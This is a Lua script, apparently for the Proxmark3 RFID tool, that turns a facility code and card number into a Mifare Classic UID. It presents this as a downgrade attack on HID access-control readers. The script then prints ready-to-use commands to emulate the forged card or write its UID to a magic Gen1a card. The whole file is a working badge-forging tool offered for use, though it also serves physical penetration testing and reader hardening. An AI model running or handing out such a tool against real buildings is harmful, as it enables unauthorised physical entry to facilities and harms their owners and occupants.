--
-- hf_mf_uid_downgrade.lua - Downgrading to UID-based Mifare Classic
-- Adapted from hf_mf_sim_hid.lua
-- Created 29.11.2023

local getopt = require('getopt')
local ansicolors  = require('ansicolors')

copyright = ''
author = "Adam Foster (evildaemond)"
version = 'v0.0.1'
desc = [[
Convert a facility code and card number to a Mifare Classic UID, which can be used as part of a downgrade attack.
This abuses the fact that some controllers interpret the UID for Mifare Classic cards as a CN and FN, it requires the controller to interpret the wiegand payload in this way.

The example of FC 146 CN 5 would be read by the reader and send as a payload like 0920005, where 9200 is dec 146 and 05 is interpreted as 5

Working on HID Readers with any of the following enabled
- Generic 14333A
- Mifare Classic SIO + CSN
- Mifare Classic CSN
]]
example = [[
    -- Downgrade a card with the facility code of 146 and card number of 5
    script run hf_mf_uid_downgrade.lua -f 146 -c 5
]]
usage = [[
script run hf_mf_uid_downgrade.lua -f <dec> -c <dec>
]]
arguments = [[
    -h            : this help
    -f <dec>      : facility code
    -c <dec>      : card number
]]

--local bxor = bit32.bxor
local bor = bit32.bor
local lshift = bit32.lshift
---
---
-- Usage help
local function help()
    print(copyright)
    print(author)
    print(version)
    print(desc)
    print(ansicolors.cyan..'Usage'..ansicolors.reset)
    print(usage)
    print(ansicolors.cyan..'Arguments'..ansicolors.reset)
    print(arguments)
    print(ansicolors.cyan..'Example usage'..ansicolors.reset)
    print(example)
end
---
-- Exit message
local function exitMsg(msg)
    print( string.rep('--',20) )
    print( string.rep('--',20) )
    print(msg)
    print()
end

local function oops(err)
    print('ERROR:', err)
    core.clearCommandBuffer()
    return nil, errr
end


local function isempty(s)
    return s == nil or s == ''
end

-- Function to combine two hexadecimal strings
local function convertToUID(hex_str1, hex_str2)
    local hex1 = string.format('%04x', hex_str1)
    local hex2 = string.format('%04x', hex_str2)

    local combined_hex = hex1 .. hex2
    local reversed_hex = ''
    for i = #combined_hex, 1, -2 do
        reversed_hex = reversed_hex .. string.sub(combined_hex, i - 1, i)
    end
    return reversed_hex
end

---
-- main
local function main(args)

    print( string.rep('--',20) )
    print( string.rep('--',20) )
    print()

    if #args == 0 then return help() end

    --I really wish a better getopt function would be brought in supporting
    --long arguments, but it seems this library was chosen for BSD style
    --compatibility
    for o, a in getopt.getopt(args, 'f:c:h') do
        if o == 'h' then return help() end
        if o == 'f' then
            if isempty(a) then return oops('You must supply a facility code') end
            facility = a
        end
        if o == 'c' then
            if isempty(a) then return oops('You must supply a card number') end
            cardnum = a
        end
    end

    --Due to my earlier complaints about how this specific getopt library
    --works, specifying ':' does not enforce supplying a value, thus we
    --need to do these checks all over again.
    if isempty(facility) then return oops('You must supply a facility code') end
    if isempty(cardnum) then return oops('You must supply a card number') end

    local cardh = convertToUID(facility, cardnum)

    print('Facility Code... ' .. facility)
    print('Card number..... ' .. cardnum)
    print('UID............. ' .. cardh)
    print('')

    -- Print emulation or writing string based on flags
    print('Emulate via PM3:')
    print('hf mf sim --1k -u', cardh, '\n')

    print('Write to Mifare Classic Card (Gen1a or Above):')
    print('hf mf csetuid -u', cardh)

end

main(args)
